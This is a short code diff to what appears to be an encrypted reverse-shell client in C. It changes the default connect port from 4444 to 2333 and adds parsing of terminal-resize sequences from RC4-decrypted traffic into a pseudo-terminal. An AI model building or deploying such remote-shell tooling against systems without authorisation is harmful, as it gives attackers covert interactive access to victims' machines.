@@ -21,7 +21,7 @@
 #endif
 
 #ifndef CONNECT_PORT
-#define CONNECT_PORT 4444
+#define CONNECT_PORT 2333
 #endif
 
 #ifndef SHELL_COMMAND
@@ -269,7 +269,26 @@ int main()
                     goto end_loop;
                 for (ssize_t i = 0; i < n; i++)
                     buffer[i] ^= rc4_next(&rc4recv);
-                CHECK_ERROR(write(master, buffer, n));
+
+                // Check if resize TTY sequence is received
+                size_t write_len = n;
+                char *resize_start = memmem(buffer, n, "\x1b[8;", 4),
+                     *resize_end;
+                if (resize_start != NULL &&
+                    (resize_end = memchr(resize_start, 't', n - (resize_start - buffer))) != NULL)
+                {
+                    resize_end++;
+                    struct winsize ws;
+                    int members = sscanf(resize_start, "\x1b[8;%hd;%hdt", &ws.ws_row, &ws.ws_col);
+                    if (members == 2)
+                    {
+                        CHECK_ERROR(ioctl(master, TIOCSWINSZ, &ws));
+                        memmove(resize_start, resize_end, write_len - (resize_end - buffer));
+                        write_len -= resize_end - resize_start;
+                    }
+                }
+                CHECK_ERROR(write(master, buffer, write_len));
+
                 // Break if the buffer is not full (i.e., no more data to read)
                 if ((size_t)n < sizeof(buffer))
                     break;
